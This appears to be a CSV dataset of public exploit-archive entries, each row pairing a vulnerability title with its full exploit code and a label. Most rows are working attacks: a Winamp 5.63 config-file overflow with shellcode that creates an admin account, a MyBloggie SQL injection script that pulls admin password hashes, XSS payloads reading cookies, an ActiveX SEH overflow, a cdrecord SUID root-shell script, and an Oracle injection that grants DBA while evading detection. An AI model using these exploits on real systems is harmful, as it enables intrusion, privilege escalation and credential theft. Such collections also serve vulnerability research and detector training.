27874,"Winamp 5.63 - 'winamp.ini' Local Overflow # Exploit Title: winampevilskin.py # Date: 25 August 2013 # Exploit Author: Ayman Sagy <aymansagy@gmail.com> # Vendor Homepage: http://www.winamp.com/ # Version: 5.63 # Tested on: Windows XP Professional SP3 Version 2002 # CVE : 2013-4694 # # Ayman Sagy <aymansagy@gmail.com> August 2013 # # This is an exploit for Bug #1 described in http://www.exploit-db.com/exploits/26558/ # Credit for discovering the vulnerability goes to Julien Ahrens from Inshell Security #  # The exploit will generate a winamp.ini file that will cause winamp to run the payload upon startup # # # I tried an alpha3 encoded egghunter but could not fit it in a single buffer and unfortunately it did not work, it wrote an invalid address on the stack then tried to access it # If you can make it work or find a solution for ASLR/DEP please contact me #  # So I wrote from scratch a venetian shellcode that will write the egghunter onto the stack then executes it # The egg and shellcode can be found in plain ASCII in memory # # Tested against Windows XP Pro SP3 # Note: If you add winamp as an exception to DEP the return address becomes 0x003100F0 instead of 0x003000F0 # run with Python 2.7  import sys, getopt, os  def usage():       print('winampevilskin.py by Ayman Sagy <aymansagy@gmail.com>\n')       print('Usage: python ' + sys.argv[0] + ' -p <payload>')       print('Payload could be:')       print('\t[user] to create new admin account ayman/P@ssw0rd')       print('\t[calc] run calculator')       print('for e.g.: python ' + sys.argv[0] + ' -p user')   #appdata = os.environ['APPDATA']   # Windows add admin user: ayman P@ssw0rd scadduser = ( b""\xbf\xab\xd0\x9a\x5b\xda\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9"" + ""\xb1\x45\x83\xc2\x04\x31\x7a\x11\x03\x7a\x11\xe2\x5e\x2c"" + ""\x72\xd2\xa0\xcd\x83\x85\x29\x28\xb2\x97\x4d\x38\xe7\x27"" + ""\x06\x6c\x04\xc3\x4a\x85\x9f\xa1\x42\xaa\x28\x0f\xb4\x85"" + ""\xa9\xa1\x78\x49\x69\xa3\x04\x90\xbe\x03\x35\x5b\xb3\x42"" + ""\x72\x86\x3c\x16\x2b\xcc\xef\x87\x58\x90\x33\xa9\x8e\x9e"" + ""\x0c\xd1\xab\x61\xf8\x6b\xb2\xb1\x51\xe7\xfc\x29\xd9\xaf"" + ""\xdc\x48\x0e\xac\x20\x02\x3b\x07\xd3\x95\xed\x59\x1c\xa4"" + ""\xd1\x36\x23\x08\xdc\x47\x64\xaf\x3f\x32\x9e\xd3\xc2\x45"" + ""\x65\xa9\x18\xc3\x7b\x09\xea\x73\x5f\xab\x3f\xe5\x14\xa7"" + ""\xf4\x61\x72\xa4\x0b\xa5\x09\xd0\x80\x48\xdd\x50\xd2\x6e"" + ""\xf9\x39\x80\x0f\x58\xe4\x67\x2f\xba\x40\xd7\x95\xb1\x63"" + ""\x0c\xaf\x98\xe9\xd3\x3d\xa7\x57\xd3\x3d\xa7\xf7\xbc\x0c"" + ""\x2c\x98\xbb\x90\xe7\xdc\x34\xdb\xa5\x75\xdd\x82\x3c\xc4"" + ""\x80\x34\xeb\x0b\xbd\xb6\x19\xf4\x3a\xa6\x68\xf1\x07\x60"" + ""\x81\x8b\x18\x05\xa5\x38\x18\x0c\xc6\xd3\x82\x81\x6d\x54"" + ""\x2e\xfe\x42\xc7\x90\x90\xf9\x73\xf1\x19\x72\x19\x83\xc1"" + ""\x15\x98\x0e\x63\xbb\x7a\x81\x23\x30\x08\x56\x94\xc4\x8a"" + ""\xb8\xfb\x69\x17\xfd\x23\x4f\xb1\xdd\x4d\xea\xc9\x3d\xfe"" + ""\x9b\x52\x5f\x92\x04\xe7\xf0\x1f\xba\x27\x4e\x84\x57\x41"" + ""\x3e\x2d\xd4\xe5\xcc\xcc\x6e\x69\x43\x7c\xae\x14\xda\xef"" + ""\xcf\xb8\x3c\xdf\x4e\x01\x79\x1f"" )  # http://shell-storm.org/shellcode/files/shellcode-739.php sccalc = (b""\x31\xC9""+                # xor ecx,ecx         ""\x51""+                    # push ecx                 ""\x68\x63\x61\x6C\x63""+    # push 0x636c6163                 ""\x54""+                    # push dword ptr esp                 ""\xB8\xC7\x93\xC2\x77""+    # mov eax,0x77c293c7                 ""\xFF\xD0""           )  if len(sys.argv) < 2:       usage()       exit(1)  try:       opts, args = getopt.getopt(sys.argv[1:],'p:') except getopt.GetoptError:       usage()       exit(1) for opt, arg in opts:       if opt == '-p':             if arg == 'user':                   shellcode = ""aymnaymn"" + ""\x90"" + ""\x90"" * 100 + scadduser + ""\x90"" * 89             elif arg == ""calc"":                   shellcode = ""aymnaymn"" + b""\x90"" * 452 + b""\x90"" + sccalc + b""\x90"" * 23             else:                   print(""Error: Invalid payload.\n"")                   usage()                   sys.exit()   #print(str(len(shellcode)))  egghunter = (""\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74""+ ""\xef\xb8\x61\x79\x6d\x6e\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"")  sploit = ( # Unicode-friendly venetian egghunter writer                                     # Setup Registers            ""\x50\x72\x50""+          # push eax twice            ""\x72"" +                 # align            ""\x59\x72\x5f""+          # pop ecx pop edi            ""\x72"" +            ""\x05\xc2\x02\x01""+      # 05 00020001      ADD EAX,1000200            ""\x72""+            ""\x2d\xc2\x01\x01""+      # 2D 00010001      SUB EAX,1000100                                     # EAX is now EAX+100            ""\x72\x48""+      # dec eax 4 times            ""\x72\x48""+            ""\x72\x48""+            ""\x72\x48\x72""+                                     # Pave Ahead                                     # write NOPs in locations that will stop later execution            ""\xc3\x86\xc2\x90""+      # C600 90          MOV BYTE PTR DS:[EAX],90            ""\x72\x40\x72""+          # 40               INC EAX            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x90""+            ""\x72\x40\x72""+                        ""\xc2\x91""               # 91               XCHG EAX,ECX            ""\x72"" +                 # align                                                # Start writing egghunter shellcode, EGG = aymn            ""\xc3\x86\x66""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x81""+ #81            ""\x72\x40\x72""+            ""\xc3\x86\xc3\x8a""+ #ca            ""\x72\x40\x72""+            ""\xc3\x86\xc3\xbf""+            ""\x72\x40\x72""+            ""\xc3\x86\x0f""+            ""\x72\x40\x72""+            ""\xc3\x86\x42""+ # 42            ""\x72\x40\x72""+            ""\xc3\x86\x52""+            ""\x72\x40\x72""+            ""\xc3\x86\x6a""+            ""\x72\x40\x72""+            ""\xc3\x86\x02""+            ""\x72\x40\x72""+                        ""\x34"" * 4 +             # Padding            ""\xc3\xb0\x30""+          # 0x003000F0  CALL EAX winamp.exe WinXP Pro SP3                                     # Note: If you add winamp as an exception to DEP the return address becomes 0x003100F0 instead of 0x003000F0             ""\x72""            ""\xc3\x86\x58""+ #58            ""\x72\x40\x72""+            ""\xc3\x86\xc3\x8d""+ #cd            ""\x72\x40\x72""+            ""\xc3\x86\x2e""+ #2e            ""\x72\x40\x72""+            ""\xc3\x86\x3c""+ # 3c            ""\x72\x40\x72""+            ""\xc3\x86\x05""+ # 5            ""\x72\x40\x72""+            ""\xc3\x86\x5a""+                        ""\x72\x40\x72""+            ""\xc3\x86\x74""+            ""\x72\x40\x72""+            ""\xc3\x86\xc3\xaf""+ # ef            ""\x72\x40\x72""+            ""\xc3\x86\xc2\xb8""+            ""\x72\x40\x72""+            ""\xc3\x86\x61""+            ""\x72\x40\x72""+            ""\xc3\x86\x79""+            ""\x72\x40\x72""+            ""\xc3\x86\x6d""+            ""\x72\x40\x72""+            ""\xc3\x86\x6e""+            ""\x72\x40\x72""+            ""\xc3\x86\xc2\x8b""+            ""\x72\x40\x72""+            ""\xc3\x86\xc3\xba""+ #fa            ""\x72\x40\x72""+            ""\xc3\x86\xc2\xaf""+ # af            ""\x72\x40\x72""+            ""\xc3\x86\x75""+ #75            ""\x72\x40\x72""+            ""\xc3\x86\xc3\xaa""+ #ea            ""\x72\x40\x72""+            ""\xc3\x86\xc2\xaf""+ # af            ""\x72\x40\x72""+            ""\xc3\x86\x75""+ #75            ""\x72\x40\x72""+            ""\xc3\x86\xc3\xa7""+ # e7            ""\x72\x40\x72""+            ""\xc3\x86\xc3\xbf""+ # ff            ""\x72\x40\x72""+            ""\xc3\x86\xc3\xa7""+ # e7            ""\x72""+            ""\x57""+                  # 57               PUSH EDI            ""\x72""+                  # align            ""\xc3\x83""+              # C3               RETN            ""\x34"" * 200             # Padding     )    winamp = (""[Winamp]\r\nutf8=1\r\n"" + ""skin="" + sploit + ""\r\n"" ""[WinampReg]\r\nIsFirstInst=0\r\nNeedReg=0\r\n"" +           ""[in_wm]\r\nnumtypes=7\r\n"" +           ""type0=WMA\r\ndescription0=Windows Media Audio File (*.WMA)\r\n"" +           ""protocol0=0\r\navtype0=0\r\n"" +           ""type1=WMV\r\ndescription1=Windows Media Video File (*.WMV)\r\n"" +           ""protocol1=0\r\navtype1=1\r\ntype2=ASF\r\n"" +           ""description2=Advanced Streaming Format (*.ASF)\r\n"" +           ""protocol2=0\r\navtype2=1\r\ntype3=MMS://\r\n"" +           ""description3=Windows Media Stream\r\nprotocol3=1\r\n"" +           ""avtype3=1\r\ntype4=MMSU://\r\n""           ""description4=Windows Media Stream\r\nprotocol4=1\r\n"" +           ""avtype4=1\r\ntype5=MMST://\r\n"" +           ""description5=Windows Media Stream\r\nprotocol5=1\r\n"" +           ""avtype5=1\r\ntype5="" + ""\x90\x90\xe9\x0f"" + ""\r\ndescription6="" +           shellcode  + ""\r\nprotocol6=0\r\navtype6=0\r\n"")  #f = open(appdata + ""\Winamp\winamp.ini"", ""wb"") or sys.exit(""Error creating winamp.ini"") f = open(""winamp.ini"", ""wb"") or sys.exit(""Error creating winamp.ini"") f.write(winamp) f.close()  print(""winamp.ini written, copy it into %APPDATA%\\Winamp"")","[""'winamp.ini'""]",1
1802,"Mozilla Firefox 1.5.0.3 - 'Loop' Denial of Service <html>  <title>Bug</Title>  <body>  <script language=""JavaScript1.2"" type=""text/javascript"">  function MainPageBookmark() {title=""Gianni Amato""; url=""http://www.gianniamato.it/"";  if (window.sidebar) { window.sidebar.addPanel(title, url,"""");} else if( window.external )  { window.external.AddFavorite( url, title); } else if(window.opera && window.print) { return true; }}  for (k=0;k<k+1;k++) MainPageBookmark();  </script>  </body>  # milw0rm.com [2006-05-18]","[""'Loop'""]",0
2118,"MyBloggie 2.1.4 - 'trackback.php' Multiple SQL Injections #!/usr/bin/php -q -d short_open_tag=on <? echo ""MyBloggie <= 2.1.4 trackback.php multiple SQL injections vulnerability /\n""; echo ""administrative credentials disclosure exploit\n""; echo ""by rgod rgod@autistici.org\n""; echo ""site: http://retrogod.altervista.org\n\n"";  /* works regardless of php.ini settings against MySQL >= 4.1 (allowing subs) */  if ($argc<3) { echo ""Usage: php "".$argv[0]."" host path OPTIONS\n""; echo ""host:      target server (ip/hostname)\n""; echo ""path:      path to MyBloggie\n""; echo ""Options:\n""; echo ""   -i           specify an existent post id (default: 1)\n""; echo ""   -T[prefix]   specify a table prefix different from default (mb_)\n""; echo ""   -p[port]:    specify a port other than 80\n""; echo ""   -P[ip:port]: specify a proxy\n""; echo ""   -d:          disclose table prefix (reccomended)\n""; echo ""Example:\r\n""; echo ""php "".$argv[0]."" localhost /MyBloggie/ -d -i7\r\n""; echo ""php "".$argv[0]."" localhost /MyBloggie/ -Tm_\r\n""; die; }  /* software site: http://mybloggie.mywebland.com/    vulnerable code in trackback.php:  ... if(!empty($_REQUEST['title'])) { $title=urldecode(substr($_REQUEST['title'],0,$tb_title_len)); } else { $tback->trackback_reply(1, ""<p>Sorry, Trackback failed.. Reason : No title</p>""); }  if(!empty($_REQUEST['url'])) { $url=urldecode($_REQUEST['url']);  if (validate_url($url)==false) { $tback->trackback_reply(1, ""<p>Sorry, Trackback failed.. Reason : URL not valid</p>""); } } else { $tback->trackback_reply(1, ""<p>Sorry, Trackback failed.. Reason : No URL</p>""); }  if(!empty($_REQUEST['excerpt']))  {   $excerpt=urldecode(substr($_REQUEST['excerpt'],0,$tb_excerpt_len));  } else {     $tback->trackback_reply(1, ""<p>Sorry, Trackback failed.. Reason : No Excerpt</p>"");  }  // The blog name if(!empty($_REQUEST['blog_name']))  {     $blog_name=urldecode(substr($_REQUEST['blog_name'],0,$tb_blogname_len));  } else  {     $blog_name=""No Blog Name"";  }  $timestamp = mktime(gmtdate('H', time(), $timezone ),gmtdate('i', time(), $timezone ),              gmtdate('s', time(), $timezone ), gmtdate('n', time(), $timezone ),              gmtdate('d', time(), $timezone ), gmtdate('Y', time(), $timezone ));  $sql = ""INSERT INTO "".COMMENT_TBL."" SET post_id='$tb_id', comment_subject='$title', comments='$excerpt', com_tstamp='$timestamp' ,               poster = '$blog_name', home='$url', comment_type='trackback'"";  $result = $db->sql_query($sql) or die(""Cannot query the database.<br>"" . mysql_error()); ...  you have sql injection in 'title', 'url', 'excerpt' and 'blog_name' argument with MySQL >= 4.1 that allows SELECT subqueries for INSERT...  so you can insert admin username & password hash inside comments and you will see them at screen also arguments are passed to urldecode(), so you can bypass magic_quotes_gpc with '%2527' sequence for the single quote char adn you can disclose table prefix going to:  http://192.168.1.3/mybloggie/index.php?mode=viewdate  you will have an error that disloses a query fragment  -  ex., injecting code in 'title' argument, query becomes:  INSERT INTO mb_comment SET post_id='1', comment_subject='hi',comments=(SELECT CONCAT('<!--',password,'-->')FROM mb_user)/*', comments='whatever', com_tstamp='1154799697' , poster = 'whatever', home='http://www.suntzu.org', comment_type='trackback' 									      */  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else {    $c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die;    }   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; }  function is_hash($hash) {  if (ereg(""^[a-f0-9]{32}"",trim($hash))) {return true;}  else {return false;} }  $host=$argv[1]; $path=$argv[2]; $port=80; $prefix=""mb_""; $post_id=""1"";//admin $proxy=""""; $dt=0;  for ($i=3; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } if ($temp==""-T"") {   $prefix=str_replace(""-T"","""",$argv[$i]); } if ($temp==""-i"") {   $post_id=(int) str_replace(""-i"","""",$argv[$i]);   echo ""post id -> "".$post_id.""\n""; } if ($temp==""-d"") {   $dt=1; } } if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  if ($dt) { $packet =""GET "".$p.""index.php?mode=viewdate HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); if (strstr($html,""You have an error in your SQL syntax"")) {   $temp=explode(""UNIXTIME("",$html);   $temp2=explode(""posts.timest"",$temp[1]);   $prefix=$temp2[0];   echo ""table prefix -> "".$prefix.""\n""; } }  $sql=""%2527,comments=(SELECT CONCAT(%2527<!--%2527,password,%2527-->%2527)FROM "".$prefix.""user)/*""; //some problems with argument length, maybe with prefix > 3 chars you will have some error, cut the '<!--' but hash will be clearly visible in comments $data=""title=hi"".$sql; $data.=""&url=http%3a%2f%2fwww%2esuntzu%2eorg""; $data.=""&excerpt=whatever""; $data.=""&blog_name=whatever""; $packet =""POST "".$p.""trackback.php/$post_id HTTP/1.0\r\n""; $packet.=""Content-Type: application/x-www-form-urlencoded\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet);  $sql=""%2527,comments=(SELECT CONCAT(%2527<!--%2527,user,%2527-->%2527)FROM "".$prefix.""user)/*""; $data=""title=hi"".$sql; $data.=""&url=http%3a%2f%2fwww%2esuntzu%2eorg""; $data.=""&excerpt=whatever""; $data.=""&blog_name=whatever""; $packet =""POST "".$p.""trackback.php/$post_id HTTP/1.0\r\n""; $packet.=""Content-Type: application/x-www-form-urlencoded\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); sleep(1);  $packet =""GET "".$p.""index.php?mode=viewid&post_id=$post_id HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); //echo $html; $temp=explode('""message""><!--',$html); for ($i=1; $i<count($temp); $i++) { $temp2=explode(""-->"",$temp[$i]); if (is_hash($temp2[0])) {   $hash=$temp2[0];   $temp2=explode(""-->"",$temp[$i+1]);   $admin=$temp2[0];   echo ""----------------------------------------------------------------\n"";   echo ""admin          -> "".$admin.""\n"";   echo ""password (md5) -> "".$hash.""\n"";   echo ""----------------------------------------------------------------\n"";   die(); } } //if you are here... echo ""exploit failed...""; ?>  # milw0rm.com [2006-08-07]","[""'trackback.php'""]",1
6624,"Arcadem Pro - 'articlecat' SQL Injection |___________________________________________________| | | Arcadem Pro (articlecat) Remote SQL Injection Vulnerability | |___________________________________________________ |---------------------Hussin X----------------------| | |    Author: Hussin X | |    Home :  WwW.IQ-ty.CoM |  WwW.TrYaG.CC | |    email:  darkangel_g85[at]Yahoo[DoT]com | | | |___________________________________________________ |                                                   | | | script : https://secure.agaresmedia.com/index.php?page=arcadempro.php | | DorK   : Copyright Â© 2007 Agares Media. Powered by AMCMS3. |___________________________________________________|   Exploit: ________    www.[target].com/Script/index.php?loadpage=./includes/articleblock.php&articlecat=-1+union+select+1,2,concat_ws(0x3a,username,password),4,5,6,7,8,9,10/**/FROM/**/amcms_users--   USer version   www.[target].com/Script/index.php?loadpage=./includes/articleblock.php&articlecat=-1+union+select+1,version(),user(),4,5,6,7,8,9,10--      Admin LogIn :  www.[target].com/admin/      ____________________________( Greetz )_________________________________ | |    All members of the Forum WwW.IQ-ty.CoM |  WwW.TrYaG.CC | | |  My friends : DeViL iRaQ | IRAQ DiveR | IRAQ_JAGUR | CraCkEr | |    Ghost Hacker | FAHD | Iraqihack | jiko | str0ke | Cyber-Zone |______________________________________________________________________                                Im IRAQi  # milw0rm.com [2008-09-29]","[""'articlecat'""]",1
35941,"Flowplayer 3.2.7 - 'linkUrl' Cross-Site Scripting source: https://www.securityfocus.com/bid/48651/info  Flowplayer is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Flowplayer 3.2.7 is vulnerable; other versions may also be affected.  http://www.example.com/flowplayer/flowplayer-3.2.7.swf?config={%22clip%22:{%22url%22:%22http://www.example.com/vod/demo.flowplayervod/flowplayer-700.flv%22,%20%22linkUrl%22:%22javascript:alert%28String.fromCharCode%2888,83,83%29%29;alert%28document.cookie%29%22},%22screen%22:{%22height%22:%22100pct%22,%22top%22:0},%22plugins%22:{%22controls%22:{%22timeColor%22:%22#ffffff%22,%22borderRadius%22:%220px%22,%22buttonOffColor%22:%22rgba%28130,130,130,1%29%22,%22bufferGradient%22:%22none%22,%22sliderColor%22:%22#000000%22,%22zIndex%22:1,%22backgroundColor%22:%22rgba%280,%200,%200,%200%29%22,%22scrubberHeightRatio%22:0.6,%22tooltipTextColor%22:%22#ffffff%22,%22volumeSliderGradient%22:%22none%22,%22spacing%22:{%22time%22:6,%22volume%22:8,%22all%22:2},%22sliderGradient%22:%22none%22,%22timeBorderRadius%22:20,%22timeBgHeightRatio%22:0.8,%22volumeSliderHeightRatio%22:0.6,%22progressGradient%22:%22none%22,%22height%22:26,%22volumeColor%22:%22#4599ff%22,%22tooltips%22:{%22marginBottom%22:5,%22buttons%22:false},%22timeSeparator%22:%22%20%22,%22name%22:%22controls%22,%22volumeBarHeightRatio%22:0.2,%22opacity%22:1,%22timeFontSize%22:12,%22left%22:%2250pct%22,%22tooltipColor%22:%22rgba%280,%200,%200,%200%29%22,%22bufferColor%22:%22#a3a3a3%22,%22volumeSliderColor%22:%22#ffffff%22,%22border%22:%220px%22,%22buttonColor%22:%22#ffffff%22,%22durationColor%22:%22#b8d9ff%22,%22autoHide%22:{%22enabled%22:true,%22hideDelay%22:500,%22hideStyle%22:%22fade%22,%22mouseOutDelay%22:500,%22hideDuration%22:400,%22fullscreenOnly%22:true},%22backgroundGradient%22:%22none%22,%22width%22:%22100pct%22,%22sliderBorder%22:%221px%20solid%20rgba%28128,%20128,%20128,%200.7%29%22,%22display%22:%22block%22,%22buttonOverColor%22:%22#ffffff%22,%22url%22:%22flowplayer.controls-3.2.5.swf%22,%22timeBorder%22:%220px%20solid%20rgba%280,%200,%200,%200.3%29%22,%22progressColor%22:%22#4599ff%22,%22timeBgColor%22:%22rgb%280,%200,%200,%200%29%22,%22scrubberBarHeightRatio%22:0.2,%22bottom%22:0,%22builtIn%22:false,%22volumeBorder%22:%221px%20solid%20rgba%28128,%20128,%20128,%200.7%29%22,%22margins%22:[2,12,2,12]}}}","[""'linkUrl'""]",1
34842,TWiki 5.0 - '/bin/view?rev' Cross-Site Scripting source: https://www.securityfocus.com/bid/44103/info  TWiki is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Versions prior to TWiki 5.0.1 are vulnerable.   GET /twiki/bin/view?rev=%27%3E%3Cscript%3Ealert%28Hello%29%3C/script%3E,"[""'/bin/view?rev'"", 'view?rev=%27%3E%3Cscript%3Ealert%28Hello%29%3C/script%3E']",1
14505,"Barcodewiz Barcode ActiveX Control 3.29 - Remote Buffer Overflow (SEH) # BarCodeWiz Barcode ActiveX Control 3.29 BoF (SEH) # Bug found: 24th July 2010 # Author: loneferret # Software: http://www.barcodewiz.com/ # Nods to exploit-db.com  # Vulnerable file BarCodeWiz.dll # LoadProperties method  # Tested on: Windows XP Professional SP3 with Internet Explorer 6 # [Needs adjustment for Internet Explorer 7]    # Vendor contacted: 24th July 2010 # Vendor first reply: 26th July 2010: Wanting more information # Vendor contacted: 26th July 2010: Sent 2 proof of concepts files # Vendor contacted: 29 July 2010: Asked for update # No Response from vendor: 30 July 2010 # Public Release : 30 July 2010  # # Shellcode calc.exe #   ----HTML FILE FROM HERE ON-----  <html> <object classid='clsid:CD3B09F1-26FB-41CD-B3F2-E178DFD3BCC6' id='target'></object> <script language='vbscript'>  buffer = String(97,""A"") jmp = unescape(""%eb%06%41%41"") SEH = unescape(""%4b%f4%02%10"") shellcode=unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") shellcode=shellcode+unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") shellcode=shellcode+unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%34%42%30%42%30%42%50%4b%48%45%34%4e%53%4b%48%4e%47"") shellcode=shellcode+unescape(""%45%30%4a%57%41%30%4f%4e%4b%58%4f%34%4a%31%4b%58%4f%35%42%42%41%30%4b%4e%49%54%4b%38%46%33%4b%38"") shellcode=shellcode+unescape(""%41%30%50%4e%41%43%42%4c%49%49%4e%4a%46%38%42%4c%46%37%47%30%41%4c%4c%4c%4d%30%41%50%44%4c%4b%4e"") shellcode=shellcode+unescape(""%46%4f%4b%43%46%35%46%42%46%50%45%47%45%4e%4b%58%4f%45%46%32%41%50%4b%4e%48%36%4b%38%4e%50%4b%54"") shellcode=shellcode+unescape(""%4b%38%4f%35%4e%31%41%30%4b%4e%4b%58%4e%31%4b%38%41%30%4b%4e%49%38%4e%35%46%52%46%50%43%4c%41%33"") shellcode=shellcode+unescape(""%42%4c%46%36%4b%48%42%44%42%53%45%58%42%4c%4a%37%4e%50%4b%38%42%44%4e%50%4b%48%42%47%4e%41%4d%4a"") shellcode=shellcode+unescape(""%4b%48%4a%36%4a%30%4b%4e%49%30%4b%48%42%38%42%4b%42%50%42%50%42%50%4b%38%4a%46%4e%43%4f%35%41%43"") shellcode=shellcode+unescape(""%48%4f%42%46%48%45%49%48%4a%4f%43%48%42%4c%4b%57%42%55%4a%56%42%4f%4c%38%46%50%4f%45%4a%36%4a%49"") shellcode=shellcode+unescape(""%50%4f%4c%48%50%50%47%55%4f%4f%47%4e%43%36%41%56%4e%56%43%56%42%30%5a"") buffer2 = String(1552, ""C"")  arg1 = buffer + jmp + SEH + shellcode + buffer2  target.LoadProperties arg1  </script>  Barcodewiz 3.29 </html>",['BarCodeWiz.dll'],1
438,"CDRecord's ReadCD - '$RSH exec()' SUID Shell Creation #!/bin/bash  # # cdrecord-suidshell.sh - I)ruid [CAU] (09.2004) # # Exploits cdrecord's exec() of $RSH before dropping privs  #  cat > ./cpbinbash.c << __EOF__ #include <stdio.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h>  main( int argc, char *argv[] ) { int fd1, fd2; int count; char buffer[1];  /* Set ID's */ setuid( geteuid() ); setgid( geteuid() );  /* Copy the shell */ if ((fd1=open( ""/bin/bash"", O_RDONLY))<0) return -1; if ((fd2=open( ""./bash"", O_WRONLY|O_CREAT))<0) return -1; while((count=read(fd1, buffer, 1))) write(fd2, buffer, count); free(buffer); close( fd1 ); close( fd2 );  /* Priv the shell */ chown( ""./bash"", geteuid(), geteuid() ); chmod( ""./bash"", 3565 ); } __EOF__  cc ./cpbinbash.c -o ./cpbinbash  # Set up environment export RSHSAVE=$RSH export RSH=./cpbinbash  # Sploit cdrecord dev= REMOTE:CAU:1,0,0 -  # Cleanup rm cpbinbash* export RSH=$RSHSAVE export RSHSAVE=  # Use our suid bash ./bash -p   // milw0rm.com [2004-09-11]","[""'$RSH""]",1
4572,"Oracle 10g - 'LT.FINDRICSET' SQL Injection (IDS Evasion) /******************************************************************/ /******* Oracle 10g LT.FINDRICSET  SQL Injection Exploit **********/ /******************************************************************/ /***********       sploit grant DBA to scott         **************/ /***********         evil cursor injection           **************/ /***********  No ""create procedure"" privileg needed! **************/ /***********     + Funny IDS evasion vith base64     **************/ /******************************************************************/ /***************** tested on oracle 10.1.0.2.0  *******************/ /******************************************************************/ /******************************************************************/ /*         Date of Public EXPLOIT:  October 26, 2007              */ /*         Written by:              Alexandr ""Sh2kerr"" Polyakov   */ /*         email:                   Alexandr.Polyakov@dsec.ru     */ /*         site:                    http://www.dsec.ru            */ /******************************************************************/ /*  Original Advisory by:                                         */ /*        David Litchfield [ davidl@ngssoftware.com ]             */ /*        Reported: 22nd August 2006                              */ /*        Date of Public Advisory: October 17, 2007               */ /*        Advisory number: #NISR17102007B                         */ /*                                                                */ /******************************************************************/ /* P.S. Special thanks David Litchfield for all his work         **/ /******************************************************************/   /*  you may need some tweaks to make it work with other users except skott  :)  */   select * from user_role_privs;   DECLARE c2gya2Vy NUMBER; BEGIN   c2gya2Vy := DBMS_SQL.OPEN_CURSOR; DBMS_SQL.PARSE(c2gya2Vy,utl_encode.text_decode('ZGVjbGFyZSBwcmFnbWEgYXV0b25vbW91c190cmFuc2FjdGlvbjsgYmVnaW4gZXhlY3V0ZSBpbW1lZGlhdGUgJ0dSQU5UIERCQSBUTyBTQ09UV  Cc7Y29tbWl0O2VuZDs=','WE8ISO8859P1', UTL_ENCODE.BASE64),0);   SYS.LT.FINDRICSET('TGV2ZWwgMSBjb21sZXRlIDop.U2VlLnUubGF0ZXIp''||dbms_sql.execute('||c2gya2Vy||')||''','DEADBEAF'); END;   select * from user_role_privs;  -----------------------------LOG--------------------------------------------- -- -- --SQL*Plus: Release 10.1.0.2.0 - Production on Fri Oct 26 16:51:39 2007 -- --Copyright (c) 1982, 2004, Oracle. All rights reserved. -- -- 